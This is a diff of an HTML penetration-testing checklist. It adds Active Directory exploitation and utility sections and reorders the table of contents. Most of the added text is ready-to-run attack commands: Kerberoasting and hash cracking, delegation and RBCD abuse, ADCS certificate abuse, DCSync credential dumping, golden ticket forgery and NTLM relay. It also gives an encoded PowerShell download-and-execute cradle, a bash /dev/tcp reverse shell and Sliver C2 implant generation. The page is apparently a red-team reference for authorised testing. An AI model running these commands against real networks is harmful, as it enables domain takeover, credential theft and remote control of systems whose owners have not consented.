+    <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-0"> Roast every SPN-holding user:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-0-0"> <code>netexec ldap [dc] -u user -p pass --kerberoasting roasts.out</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-0-1"> <code>impacket-GetUserSPNs -request -dc-ip [dc] [dom]/user:pass</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-0-2"> <code>Rubeus.exe kerberoast /outfile:roasts.txt</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-1"> AS-REP roast pre-auth-not-required accounts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-1-0"> <code>netexec ldap [dc] -u user -p pass --asreproast asrep.out</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-1-1"> <code>impacket-GetNPUsers -dc-ip [dc] -no-pass -usersfile users.txt [dom]/</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-kerberoast-asrep-wf-2"> Crack offline with hashcat:</li>
+  </ul>
+<pre><code class="language-bash"># Kerberoast TGS (mode 13100)
+hashcat -m 13100 roasts.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+# AS-REP (mode 18200)
+hashcat -m 18200 asrep.out /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-unconstrained">11.9.2 Unconstrained Delegation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-0"> Find unconstrained-delegation hosts:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-0-0"> BloodHound built-in query</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-0-1"> <code>Get-DomainComputer -Unconstrained</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-1"> Coerce a DC to authenticate to a controlled host with this flag:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-1-0"> Tools: PetitPotam, Coercer, PrinterBug, DFSCoerce</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-1-1"> Capture the inbound TGT with Rubeus monitor on the host</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-unconstrained-wf-2"> Extract the TGT and use it for DCSync</li>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-constrained">11.9.3 Constrained Delegation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-0"> Find principals trusted for delegation to specific SPNs:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-0-0"> <code>Get-DomainUser -TrustedToAuth</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-0-1"> BloodHound delegation map</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-1"> S4U2self + S4U2proxy chain:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-1-0"> <code>Rubeus.exe s4u /user:svc /rc4:[hash] /impersonateuser:Administrator /msdsspn:cifs/[target]</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-constrained-wf-1-1"> Then PTT and access the target SPN</li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-rbcd">11.9.4 Resource-Based Constrained Delegation</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-rbcd-wf-0"> Full RBCD chain (3 steps):</li>
+  </ul>
+<pre><code class="language-bash"># Step 1: Add a fake computer (requires MAQ &gt; 0)
+impacket-addcomputer -computer-name FAKE$ -computer-pass Pass1! \
+  -dc-ip [dc] [domain]/[user]:[pass]
+
+# Step 2: Write RBCD delegation on the target
+rbcd.py -delegate-from FAKE$ -delegate-to TARGET$ \
+  -action write [domain]/[user]:[pass]
+
+# Step 3: S4U to get a service ticket as Administrator
+impacket-getST -spn cifs/[target] -impersonate Administrator \
+  [domain]/FAKE$:Pass1!
+
+# Use the ticket
+export KRB5CCNAME=Administrator@cifs_[target]@[DOMAIN].ccache
+impacket-psexec -k -no-pass [target]</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-shadow-creds">11.9.5 Shadow Credentials</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-shadow-creds-wf-0"> Write msDS-KeyCredentialLink on the target:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-shadow-creds-wf-0-0"> <code>certipy shadow auto -u user@[dom] -p pass -account [target]</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-shadow-creds-wf-1"> Authenticate via PKINIT and recover the NT hash</li>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-adcs">11.9.6 AD Certificate Services (ESC1&ndash;ESC16)</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-0"> Map the ADCS posture:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-0-0"> <code>certipy find -u user@[dom] -p pass -dc-ip [dc] -enabled -stdout</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-0-1"> <code>certipy find -u user@[dom] -p pass -dc-ip [dc] -vulnerable</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1"> Pick the right ESC primitive:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-0"> ESC1: SubjectAltName on a User template &mdash; request as any user</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-1"> ESC4: writable template ACL &mdash; flip to ESC1, then exploit</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-2"> ESC6: <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> on the CA</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-3"> ESC7: Manage Certificates ACL on the CA</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-4"> ESC8: HTTP enrolment + NTLM relay</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-5"> ESC9 / ESC10: weak certificate mapping</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-6"> ESC11: ICPR over RPC</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-1-7"> ESC13: OID issuance policy abuse</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-adcs-wf-2"> Exploit and PTT:</li>
+  </ul>
+<pre><code class="language-bash"># Request certificate as Administrator (ESC1)
+certipy req -u [user]@[domain] -p [pass] -ca [CA-Name] \
+  -template [VulnTemplate] -upn Administrator@[domain]
+
+# Authenticate with the certificate to get NT hash
+certipy auth -pfx administrator.pfx -dc-ip [dc]
+
+# Use the NT hash
+impacket-psexec -hashes :[nt-hash] [domain]/Administrator@[dc]</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-acl-abuse">11.9.7 ACL Abuse</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-0"> Generic-Write &rarr; targeted Kerberoast:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-0-0"> Set an SPN on a victim user, kerberoast, crack</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-1"> Generic-Write &rarr; Shadow Credentials</li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-2"> WriteDACL &rarr; grant yourself DCSync:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-2-0"> Add <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-acl-abuse-wf-3"> AddMember chains via nested groups</li>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-ticket-forgery">11.9.8 Ticket Forgery</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-0"> Golden ticket from the krbtgt hash:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-0-0"> <code>ticketer.py -nthash [krbtgt-nt] -domain-sid [sid] -domain [dom] -spn krbtgt/[dom] Administrator</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-0-1"> <code>export KRB5CCNAME=Administrator.ccache</code> then DCSync as proof</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-1"> Silver ticket for a single service:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-1-0"> Forge a TGS with the service account&rsquo;s hash &mdash; no AS-REQ trail</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-ticket-forgery-wf-2"> Diamond / Sapphire tickets when source-of-truth fields matter</li>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-dcsync">11.9.9 DCSync</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-dcsync-wf-0"> Confirm the principal has the right ACL:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-dcsync-wf-0-0"> <code>DS-Replication-Get-Changes</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-dcsync-wf-0-1"> <code>DS-Replication-Get-Changes-All</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-dcsync-wf-0-2"> <code>DS-Replication-Get-Changes-In-Filtered-Set</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-dcsync-wf-1"> Run from the foothold:</li>
+  </ul>
+<pre><code class="language-bash"># From Linux
+impacket-secretsdump [domain]/[user]:[pass]@[dc] -just-dc
+
+# From Windows (mimikatz)
+mimikatz # lsadump::dcsync /user:[domain]\krbtgt
+mimikatz # lsadump::dcsync /user:[domain]\Administrator</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-ad-exploitation-ntlm-relay">11.9.10 NTLM Relay Attacks</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-0"> Set up the relay listener:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-0-0"> <code>ntlmrelayx.py -tf targets.txt -smb2support -socks</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-0-1"> Optional: <code>--escalate-user</code> to make the relayed user a domain admin via LDAP</li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-1"> Coerce the source of the NTLM:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-1-0"> Coercer (multi-protocol)</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-1-1"> PetitPotam (EFSRPC)</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-1-2"> PrinterBug (RPC printer)</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-1-3"> DFSCoerce (DFSNM)</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-1-4"> AuthCoerce on MSSQL via <code>xp_dirtree</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-2"> Choose the relay target by capability:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-2-0"> LDAP to add SPN / set RBCD / grant DCSync</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-2-1"> LDAPS to write password</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-2-2"> AD CS HTTP for cert issuance</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-ntlm-relay-wf-2-3"> SMB on hosts without signing for SOCKS access</li>
+      </ul>
+    </li>
+  </ul>
+<p><strong>References:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://dirkjanm.io/" target="_blank" rel="noopener noreferrer">dirk-jan blog</a></p>
+
+<h4 id="methodology-ad-exploitation-trusts">11.9.11 Domain &amp; Forest Trusts</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-0"> Enumerate trusts and their direction:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-0-0"> <code>Get-DomainTrust</code></li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-0-1"> <code>nltest /domain_trusts /all_trusts</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-1"> Cross-trust ticket forgery:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-1-0"> Inter-realm key extraction &mdash; forge a referral ticket</li>
+        <li><input type="checkbox" data-id="methodology-ad-exploitation-trusts-wf-1-1"> Cross-forest delegation abuses for two-way forest trusts</li>
+      </ul>
+    </li>
+  </ul>
+
+<h5>AD Attack Paths Quick Reference</h5>
+<table class="custom-table">
+  <thead>
+    <tr>
+      <th>Attack</th>
+      <th>Precondition</th>
+      <th>Tool</th>
+      <th>Key Command</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Kerberoasting</td>
+      <td>Any domain user</td>
+      <td>Rubeus / impacket</td>
+      <td><code>Rubeus.exe kerberoast /outfile:tgs.txt</code></td>
+    </tr>
+    <tr>
+      <td>AS-REP Roasting</td>
+      <td>Pre-auth disabled accounts</td>
+      <td>impacket / netexec</td>
+      <td><code>impacket-GetNPUsers -no-pass -usersfile users.txt [dom]/</code></td>
+    </tr>
+    <tr>
+      <td>Unconstrained Delegation</td>
+      <td>Controlled host with UD flag</td>
+      <td>Rubeus + Coercer</td>
+      <td><code>Rubeus.exe monitor /nowrap</code> + coerce DC</td>
+    </tr>
+    <tr>
+      <td>Constrained Delegation</td>
+      <td>User/computer trusted for delegation</td>
+      <td>Rubeus / impacket</td>
+      <td><code>Rubeus.exe s4u /user:svc /rc4:[hash] /msdsspn:cifs/[target]</code></td>
+    </tr>
+    <tr>
+      <td>RBCD</td>
+      <td>GenericWrite on target + MAQ &gt; 0</td>
+      <td>impacket + rbcd.py</td>
+      <td><code>addcomputer</code> &rarr; <code>rbcd.py</code> &rarr; <code>getST</code></td>
+    </tr>
+    <tr>
+      <td>Shadow Credentials</td>
+      <td>GenericWrite on target</td>
+      <td>certipy / pyWhisker</td>
+      <td><code>certipy shadow auto -account [target]</code></td>
+    </tr>
+    <tr>
+      <td>ADCS ESC1</td>
+      <td>Vulnerable template + enrollment</td>
+      <td>certipy</td>
+      <td><code>certipy req -template [vuln] -upn Administrator@[dom]</code></td>
+    </tr>
+    <tr>
+      <td>DCSync</td>
+      <td>Replication ACLs (DA / WriteDACL)</td>
+      <td>impacket / mimikatz</td>
+      <td><code>impacket-secretsdump [dom]/[user]@[dc] -just-dc</code></td>
+    </tr>
+    <tr>
+      <td>Golden Ticket</td>
+      <td>krbtgt NT hash + domain SID</td>
+      <td>impacket / mimikatz</td>
+      <td><code>ticketer.py -nthash [hash] -domain-sid [sid] -domain [dom]</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/windows-hardening/active-directory-methodology" target="_blank" rel="noopener noreferrer">HackTricks AD</a> &middot; <a href="https://blog.harmj0y.net/" target="_blank" rel="noopener noreferrer">harmj0y blog</a> &middot; <a href="https://dirkjanm.io/" target="_blank" rel="noopener noreferrer">dirk-jan blog</a> &middot; <a href="https://posts.specterops.io/" target="_blank" rel="noopener noreferrer">SpecterOps blog</a></p>
+
+<h3 id="methodology-utilities">11.10 Utilities</h3>
+<p>Operator one-liners, encoders, evasion helpers, C2 clients pulled out of larger sections for fast access.</p>
+<h4 id="methodology-utilities-encoders">11.10.1 Encoders</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-utilities-encoders-wf-0"> Encode for the right ingestion path:</li>
+  </ul>
+<pre><code class="language-bash"># PowerShell base64 (UTF-16LE for -enc flag)
+echo -en 'IEX(New-Object Net.WebClient).DownloadString("http://[ip]/a.ps1")' \
+  | iconv -t UTF-16LE | base64 -w 0
+
+# Linux base64
+echo -n 'bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1' | base64 -w0
+
+# URL encode
+python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" 'payload'</code></pre>
+  <ul>
+  </ul>
+
+<h4 id="methodology-utilities-c2-clients">11.10.2 C2 Clients</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-utilities-c2-clients-wf-0"> Sliver for cross-platform implants:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-utilities-c2-clients-wf-0-0"> <code>sliver-server</code> for team server</li>
+        <li><input type="checkbox" data-id="methodology-utilities-c2-clients-wf-0-1"> Generate: <code>generate --mtls [you]:443 --save .</code></li>
+      </ul>
+    </li>
+    <li><input type="checkbox" data-id="methodology-utilities-c2-clients-wf-1"> Mythic for multi-agent ops</li>
+    <li><input type="checkbox" data-id="methodology-utilities-c2-clients-wf-2"> Cobalt Strike when the engagement licences it</li>
+  </ul>
+<p><strong>References:</strong> <a href="https://sliver.sh/" target="_blank" rel="noopener noreferrer">Sliver C2 wiki</a> &middot; <a href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/" target="_blank" rel="noopener noreferrer">Cobalt Strike user guide</a></p>
+
+<h4 id="methodology-utilities-impacket">11.10.3 Impacket Suite</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-utilities-impacket-wf-0"> Daily-driver tools:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-utilities-impacket-wf-0-0"> <code>secretsdump.py</code>, <code>psexec.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code></li>
+        <li><input type="checkbox" data-id="methodology-utilities-impacket-wf-0-1"> <code>ntlmrelayx.py</code>, <code>getST.py</code>, <code>addcomputer.py</code></li>
+        <li><input type="checkbox" data-id="methodology-utilities-impacket-wf-0-2"> <code>rpcdump.py</code>, <code>samrdump.py</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<h4 id="methodology-utilities-bloodyad">11.10.4 BloodyAD</h4>
+  <ul>
+    <li><input type="checkbox" data-id="methodology-utilities-bloodyad-wf-0"> When you need to write LDAP attributes from Linux:
+      <ul>
+        <li><input type="checkbox" data-id="methodology-utilities-bloodyad-wf-0-0"> <code>bloodyAD -d [dom] -u user -p pass --host [dc] add user newUser ...</code></li>
+        <li><input type="checkbox" data-id="methodology-utilities-bloodyad-wf-0-1"> <code>bloodyAD -d [dom] -u user -p pass --host [dc] set object [target] msDS-AllowedToActOnBehalfOfOtherIdentity ...</code></li>
+      </ul>
+    </li>
+  </ul>
+
+<p><strong>General references:</strong> <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer">HackTricks</a> &middot; <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer">PayloadsAllTheThings</a> &middot; <a href="https://lolbas-project.github.io/" target="_blank" rel="noopener noreferrer">LOLBAS</a></p>
 <h2 id="references">12. References</h2>
 <p>[1] Orange Cyberdefense, "OCD Mindmaps," [Online]. Available: <a href="https://orange-cyberdefense.github.io/ocd-mindmaps/" target="_blank" rel="noopener noreferrer">https://orange-cyberdefense.github.io/ocd-mindmaps/</a>.</p>
 <p>[2] HackTricks, "Pentesting Methodology and Resources," [Online]. Available: <a href="https://hacktricks.wiki/" target="_blank" rel="noopener noreferrer">https://hacktricks.wiki/</a>.</p>
@@ -11105,23 +12592,16 @@ bloodyAD -u [user] -k -d [domain] --host [dc-ip] [command]
         <i class="bi bi-caret-down-fill"></i>
       </button>
       <div class="dropdown-container">
-        <a href="#methodology-recon">11.1 Reconnaissance &amp; Scanning</a>
-        <a href="#methodology-initial">11.2 Initial Access &amp; Client-Side Execution</a>
-        <a href="#methodology-evasion">11.3 Antivirus &amp; Defense Evasion</a>
-        <a href="#methodology-tunneling">11.4 Tunneling &amp; Pivoting</a>
-        <a href="#methodology-privesc">11.5 Privilege Escalation</a>
-        <a href="#methodology-credentials">11.6 Credential Access</a>
-        <a href="#methodology-lateral">11.7 Lateral Movement</a>
-        <a href="#methodology-ad">11.8 Active Directory Attacks</a>
-        <a href="#methodology-mssql">11.9 MSSQL Server Attacks</a>
-        <a href="#methodology-clientside">11.10 Client-Side Attack Vectors</a>
-        <a href="#methodology-egress">11.11 Network Filter &amp; Egress Evasion</a>
-        <a href="#methodology-kiosk">11.12 Kiosk / Restricted Environment Breakout</a>
-        <a href="#methodology-delegation">11.13 Kerberos Delegation Abuse</a>
-        <a href="#methodology-acl">11.14 AD ACL &amp; Object Permission Abuse</a>
-        <a href="#methodology-adcs">11.15 AD Certificate Services (ADCS)</a>
-        <a href="#methodology-trusts">11.16 Domain &amp; Forest Trust Attacks</a>
-        <a href="#methodology-objectives">11.17 Objectives &amp; Reporting</a>
+        <a href="#methodology-tools-setup">11.1 Tools &amp; Setup</a>
+        <a href="#methodology-reconnaissance">11.2 Reconnaissance</a>
+        <a href="#methodology-initial-access">11.3 Initial Access</a>
+        <a href="#methodology-tunneling">11.4 Tunneling</a>
+        <a href="#methodology-windows-postex">11.5 Windows Post Exploitation</a>
+        <a href="#methodology-linux-postex">11.6 Linux Post Exploitation</a>
+        <a href="#methodology-mssql">11.7 MSSQL</a>
+        <a href="#methodology-ad-enumeration">11.8 Active Directory Enumeration</a>
+        <a href="#methodology-ad-exploitation">11.9 Active Directory Exploitation</a>
+        <a href="#methodology-utilities">11.10 Utilities</a>
       </div>
     </div>
     <div class="section-flow-22">
